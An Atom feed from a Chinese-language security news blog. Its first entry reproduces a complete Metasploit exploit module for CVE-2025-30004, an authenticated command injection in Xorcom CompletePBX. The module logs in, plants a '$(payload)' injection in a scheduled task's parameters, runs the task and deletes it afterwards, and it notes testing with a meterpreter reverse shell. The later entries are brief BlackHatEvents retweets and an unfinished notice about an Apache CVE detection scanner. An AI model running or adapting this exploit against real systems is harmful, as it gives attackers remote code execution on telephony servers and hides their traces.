<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>liancc&#39; infos blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-06-30T16:15:17.425Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>lianccc</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Xorcom CompletePBX Authenticated Command Injection via Task Scheduler</title>
    <link href="http://example.com/2025/06/30/github_1698775966/"/>
    <id>http://example.com/2025/06/30/github_1698775966/</id>
    <published>2025-06-30T16:15:17.429Z</published>
    <updated>2025-06-30T16:15:17.425Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Xorcom CompletePBX Authenticated Command Injection via Task Scheduler</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> 2025-30004</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Xorcom CompletePBX 5.2.35及更早版本中存在一个通过任务调度功能实现的认证命令注入漏洞。该漏洞允许具有超级管理员权限的用户（admin）通过不当清理的用户控制输入，以Web服务器权限执行任意命令。即使创建具有最高权限的新用户，该漏洞也无法利用。</p><p><strong>产品厂商：</strong> Xorcom</p><p><strong>产品名称：</strong> CompletePBX</p><p><strong>影响版本：</strong> &lt;&#x3D; 5.2.35</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/837363493262e4490ea7c723fd612eb26a8201fa/modules%2Fexploits%2Flinux%2Fhttp%2Fxorcom_completepbx_scheduler.rb">https://github.com/rapid7/metasploit-framework/blob/837363493262e4490ea7c723fd612eb26a8201fa/modules%2Fexploits%2Flinux%2Fhttp%2Fxorcom_completepbx_scheduler.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote<br>  Rank = ExcellentRanking<br><br>  include Msf::Exploit::Remote::HttpClient<br>  prepend Msf::Exploit::Remote::AutoCheck<br><br>  def initialize(info = &#123;&#125;)<br>    super(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;Xorcom CompletePBX Authenticated Command Injection via Task Scheduler&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; %q&#123;<br>          This module exploits an authenticated command injection vulnerability <span class="hljs-keyword">in</span> Xorcom CompletePBX<br>          versions &lt;= <span class="hljs-number">5.2</span>.<span class="hljs-number">35.</span> The issue resides <span class="hljs-keyword">in</span> the task scheduler functionality, where user-controlled<br>          input <span class="hljs-keyword">is</span> improperly sanitized, allowing arbitrary command execution <span class="hljs-keyword">with</span> web server privileges.<br><br>          Only the superadmin user (admin) has the necessary permissions <span class="hljs-keyword">to</span> trigger this exploit.<br>          Even <span class="hljs-keyword">when</span> creating a <span class="hljs-keyword">new</span> user <span class="hljs-keyword">with</span> maximum privileges, the vulnerability does <span class="hljs-keyword">not</span> work.<br>        &#125;,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;Valentin Lobstein&#x27;</span> <span class="hljs-comment"># Research and module development</span><br>        ],<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; MSF_LICENSE,<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2025-30004&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://www.xorcom.com/products/completepbx/&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://chocapikk.com/posts/2025/completepbx/&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; %w[unix linux],<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; [ARCH_CMD],<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Unix/Linux Command Shell&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; %w[unix linux],<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_CMD<br>              <span class="hljs-comment"># tested with cmd/linux/http/x64/meterpreter/reverse_tcp</span><br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2025-03-02&#x27;</span>,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [CRASH_SAFE],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [REPEATABLE_SESSION],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [IOC_IN_LOGS]<br>        &#125;<br>      )<br>    )<br><br>    register_options([<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Valid CompletePBX username&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Valid CompletePBX password&#x27;</span>]),<br>    ])<br>  end<br><br>  def check<br>    print_status(<span class="hljs-string">&#x27;Checking if the target is running CompletePBX...&#x27;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span><br>    &#125;)<br><br>    <span class="hljs-keyword">return</span> Exploit::CheckCode::Unknown(<span class="hljs-string">&#x27;No response from target.&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">return</span> Exploit::CheckCode::Unknown(<span class="hljs-string">&quot;Unexpected HTTP response code: <span class="hljs-subst">#&#123;res.code&#125;</span>&quot;</span>) <span class="hljs-keyword">unless</span> res.code == <span class="hljs-number">200</span><br><br>    doc = res.get_html_document<br><br>    <span class="hljs-keyword">if</span> doc.at(<span class="hljs-string">&#x27;//meta[@name=&quot;description&quot;][@content=&quot;CompletePBX&quot;]&#x27;</span>) ||<br>       doc.at(<span class="hljs-string">&#x27;//meta[@name=&quot;application-name&quot;][@content=&quot;Ombutel&quot;]&#x27;</span>)<br><br>      print_good(<span class="hljs-string">&quot;Detected CompletePBX on <span class="hljs-subst">#&#123;peer&#125;</span>&quot;</span>)<br>      <span class="hljs-keyword">return</span> Exploit::CheckCode::Appears<br>    end<br><br>    <span class="hljs-keyword">return</span> Exploit::CheckCode::Safe(<span class="hljs-string">&#x27;Target does not appear to be running CompletePBX.&#x27;</span>)<br>  end<br><br>  def login<br>    print_status(<span class="hljs-string">&quot;Attempting authentication with username: <span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>]&#125;</span>&quot;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;userid&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;userpass&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]<br>      &#125;<br>    &#125;)<br><br>    <span class="hljs-keyword">unless</span> res<br>      fail_with(Failure::Unreachable, <span class="hljs-string">&#x27;No response from target&#x27;</span>)<br>    end<br><br>    <span class="hljs-keyword">unless</span> res.code == <span class="hljs-number">200</span><br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&quot;Unexpected HTTP response code: <span class="hljs-subst">#&#123;res.code&#125;</span>&quot;</span>)<br>    end<br><br>    sid_cookie = res.get_cookies.scan(<span class="hljs-regexp">/sid=[a-f0-9]+/</span>).first<br><br>    <span class="hljs-keyword">unless</span> sid_cookie<br>      fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Authentication failed: No session ID received&#x27;</span>)<br>    end<br><br>    print_good(<span class="hljs-string">&quot;Authentication successful! Session ID: <span class="hljs-subst">#&#123;sid_cookie&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> sid_cookie<br>  end<br><br>  def get_latest_task_id(sid_cookie, task_desc)<br>    print_status(<span class="hljs-string">&quot;Retrieving latest task ID for description: <span class="hljs-subst">#&#123;task_desc&#125;</span>...&quot;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;vars_get&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;class&#x27;</span> =&gt; <span class="hljs-string">&#x27;scheduler&#x27;</span>,<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;tasks&#x27;</span>,<br>        <span class="hljs-string">&#x27;offset&#x27;</span> =&gt; <span class="hljs-string">&#x27;0&#x27;</span>,<br>        <span class="hljs-string">&#x27;max&#x27;</span> =&gt; <span class="hljs-string">&#x27;20&#x27;</span>,<br>        <span class="hljs-string">&#x27;search&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;cookie&#x27;</span> =&gt; sid_cookie<br>    &#125;)<br><br>    <span class="hljs-keyword">unless</span> res<br>      fail_with(Failure::Unreachable, <span class="hljs-string">&#x27;No response from target while fetching tasks&#x27;</span>)<br>    end<br><br>    json_res = res.get_json_document<br>    tasks = json_res[<span class="hljs-string">&#x27;rows&#x27;</span>]<br><br>    <span class="hljs-keyword">unless</span> tasks<br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Failed to retrieve task list&#x27;</span>)<br>    end<br><br>    tasks.each <span class="hljs-keyword">do</span> |task|<br>      <span class="hljs-keyword">if</span> task[<span class="hljs-number">2</span>] == task_desc<br>        print_good(<span class="hljs-string">&quot;Found task with ID: <span class="hljs-subst">#&#123;task[<span class="hljs-number">0</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> task[<span class="hljs-number">0</span>]<br>      end<br>    end<br><br>    fail_with(Failure::NotFound, <span class="hljs-string">&quot;Could not find the task with description: <span class="hljs-subst">#&#123;task_desc&#125;</span>&quot;</span>)<br>  end<br><br>  def create_task(sid_cookie)<br>    task_desc = Faker::Lorem.sentence(word_count: <span class="hljs-number">4</span>)<br>    notes = Faker::Lorem.paragraph(sentence_count: <span class="hljs-number">3</span>)<br>    print_status(<span class="hljs-string">&quot;Creating malicious scheduled task with description: <span class="hljs-subst">#&#123;task_desc&#125;</span>&quot;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;cookie&#x27;</span> =&gt; sid_cookie,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;script&#x27;</span> =&gt; <span class="hljs-string">&#x27;backup&#x27;</span>,<br>        <span class="hljs-string">&#x27;description&#x27;</span> =&gt; task_desc,<br>        <span class="hljs-string">&#x27;starting&#x27;</span> =&gt; Time.now.strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M&#x27;</span>),<br>        <span class="hljs-string">&#x27;interval&#x27;</span> =&gt; <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;interval_unit&#x27;</span> =&gt; <span class="hljs-string">&#x27;month&#x27;</span>,<br>        <span class="hljs-string">&#x27;parameters&#x27;</span> =&gt; <span class="hljs-string">&quot;$(<span class="hljs-subst">#&#123;payload.encoded&#125;</span>)&quot;</span>,<br>        <span class="hljs-string">&#x27;notes&#x27;</span> =&gt; notes,<br>        <span class="hljs-string">&#x27;data&#x27;</span> =&gt; <span class="hljs-string">&#x27;0&#x27;</span>,<br>        <span class="hljs-string">&#x27;class&#x27;</span> =&gt; <span class="hljs-string">&#x27;scheduler&#x27;</span>,<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;save_task&#x27;</span>,<br>        <span class="hljs-string">&#x27;mode&#x27;</span> =&gt; <span class="hljs-string">&#x27;create&#x27;</span><br>      &#125;<br>    &#125;)<br><br>    <span class="hljs-keyword">unless</span> res<br>      fail_with(Failure::Unreachable, <span class="hljs-string">&#x27;No response from target while creating task&#x27;</span>)<br>    end<br><br>    json_res = res.get_json_document<br>    state = json_res[<span class="hljs-string">&#x27;state&#x27;</span>]<br><br>    <span class="hljs-keyword">if</span> state == <span class="hljs-string">&#x27;success&#x27;</span><br>      print_good(<span class="hljs-string">&#x27;Malicious task successfully created.&#x27;</span>)<br>      <span class="hljs-keyword">return</span> task_desc<br>    <span class="hljs-keyword">else</span><br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Failed to create the malicious task&#x27;</span>)<br>    end<br>  end<br><br>  def run_task(sid_cookie, task_id)<br>    print_status(<span class="hljs-string">&quot;Executing malicious task ID <span class="hljs-subst">#&#123;task_id&#125;</span>...&quot;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;cookie&#x27;</span> =&gt; sid_cookie,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;class&#x27;</span> =&gt; <span class="hljs-string">&#x27;scheduler&#x27;</span>,<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;run_task&#x27;</span>,<br>        <span class="hljs-string">&#x27;mode&#x27;</span> =&gt; <span class="hljs-string">&#x27;run&#x27;</span>,<br>        <span class="hljs-string">&#x27;data&#x27;</span> =&gt; task_id.to_s<br>      &#125;<br>    &#125;)<br><br>    <span class="hljs-keyword">unless</span> res<br>      fail_with(Failure::Unreachable, <span class="hljs-string">&#x27;No response from target while executing task&#x27;</span>)<br>    end<br><br>    print_good(<span class="hljs-string">&#x27;Task executed successfully!&#x27;</span>)<br>  end<br><br>  def delete_task(sid_cookie, task_id)<br>    %w[<span class="hljs-keyword">delete</span> deleteConfirmed].each <span class="hljs-keyword">do</span> |mode|<br>      print_status(<span class="hljs-string">&quot;Sending delete request (mode=<span class="hljs-subst">#&#123;mode&#125;</span>) for task ID <span class="hljs-subst">#&#123;task_id&#125;</span>...&quot;</span>)<br><br>      send_request_cgi(&#123;<br>        <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        <span class="hljs-string">&#x27;cookie&#x27;</span> =&gt; sid_cookie,<br>        <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>        <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;class&#x27;</span> =&gt; <span class="hljs-string">&#x27;scheduler&#x27;</span>,<br>          <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;delete_task&#x27;</span>,<br>          <span class="hljs-string">&#x27;mode&#x27;</span> =&gt; mode,<br>          <span class="hljs-string">&#x27;data&#x27;</span> =&gt; task_id.to_s<br>        &#125;<br>      &#125;)<br>    end<br><br>    print_good(<span class="hljs-string">&quot;Task <span class="hljs-subst">#&#123;task_id&#125;</span> deleted successfully!&quot;</span>)<br>  end<br><br>  def exploit<br>    sid_cookie = login<br>    task_desc = create_task(sid_cookie)<br>    task_id = get_latest_task_id(sid_cookie, task_desc)<br>    run_task(sid_cookie, task_id)<br>    delete_task(sid_cookie, task_id)<br>  end<br>end<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Xorcom CompletePBX Authenticated Comman</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>BlackHatEvents twitter update</title>
    <link href="http://example.com/2025/06/30/twitter_604769248/"/>
    <id>http://example.com/2025/06/30/twitter_604769248/</id>
    <published>2025-06-30T16:01:11.787Z</published>
    <updated>2025-06-30T16:01:11.788Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> RT @surya4n6: 抢占我们罕见的企业级macOS蓝队培训席位。实践实验室，真实世界威胁检测与数字取证及事件响应（DFIR）@…</p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1939705097564393849">https://x.com/BlackHatEvents/status/1939705097564393849</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; RT @surya4n6: 抢占我们罕见的企业级macOS蓝队培训席位。实践实验室，真实世界威胁检测与数字取证及事件响应（DFIR）@…&lt;/p&gt;
</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
    
  </entry>
  
  <entry>
    <title>BlackHatEvents twitter update</title>
    <link href="http://example.com/2025/06/30/twitter_1687137571/"/>
    <id>http://example.com/2025/06/30/twitter_1687137571/</id>
    <published>2025-06-30T16:01:02.465Z</published>
    <updated>2025-06-30T16:01:02.463Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> RT @SecureYeti：教导你的员工成为你最强大的捍卫者！Secure Yeti的@jaysonstreet提供的培训将帮助你让安全变得“平易近人”…</p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1939705417518415996">https://x.com/BlackHatEvents/status/1939705417518415996</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; RT @SecureYeti：教导你的员工成为你最强大的捍卫者！Secure Yeti的@jaysonstreet提供的培训将帮助你让安全变得“平</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
    
  </entry>
  
  <entry>
    <title>BlackHatEvents twitter update</title>
    <link href="http://example.com/2025/06/30/twitter_1924812840/"/>
    <id>http://example.com/2025/06/30/twitter_1924812840/</id>
    <published>2025-06-30T16:00:56.566Z</published>
    <updated>2025-06-30T16:00:56.563Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> RT @getsquarex: SquareX的Audrey Adeline将在Black Hat (@BlackHatEvents) 的“网络安全先锋指南”小组讨论中发言。</p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1939714203612225980">https://x.com/BlackHatEvents/status/1939714203612225980</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; RT @getsquarex: SquareX的Audrey Adeline将在Black Hat (@BlackHatEvents) 的“网络安</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
    
  </entry>
  
  <entry>
    <title>Apache HTTP Server SSL证书验证绕过漏洞</title>
    <link href="http://example.com/2025/06/30/github_481563331/"/>
    <id>http://example.com/2025/06/30/github_481563331/</id>
    <published>2025-06-30T16:00:19.287Z</published>
    <updated>2025-06-30T16:00:19.286Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apache HTTP Server SSL证书验证绕过漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-40898</li></ul><p><strong>漏洞类型：</strong> 配置问题</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CVE-2024-40898是Apache HTTP Server中的一个安全漏洞，允许攻击者在特定条件下绕过SSL证书验证，可能导致TLS上的中间人攻击(MitM)。此Python脚本是一个概念验证(PoC)扫描器，用于检测该漏洞。</p><p><strong>产品厂商：</strong> Apache</p><p><strong>产品名称：</strong> Apache HTTP Server</p><p><strong>来源：</strong> <a href="https://github.com/ForceEA001/CVE-2024-40898-SSL-Bypass-Detection">https://github.com/ForceEA001/CVE-2024-40898-SSL-Bypass-Detection</a></p><p><strong>类型：</strong> CVE-2024:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>.gitignore</li><li>CVE-2024-40898-SSL-Bypass-Detection</li><li>LICENSE</li><li>README.md</li><li>check_cve_40898.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><p>CVE-2024-40898 SSL Certificate Validation Bypass Scanner</p><p>This repository contains a Python-based proof-of-concept (PoC) script to detect <em>CVE-2024-40898</em>, a vulnerability in Apache HTTP Server that allows 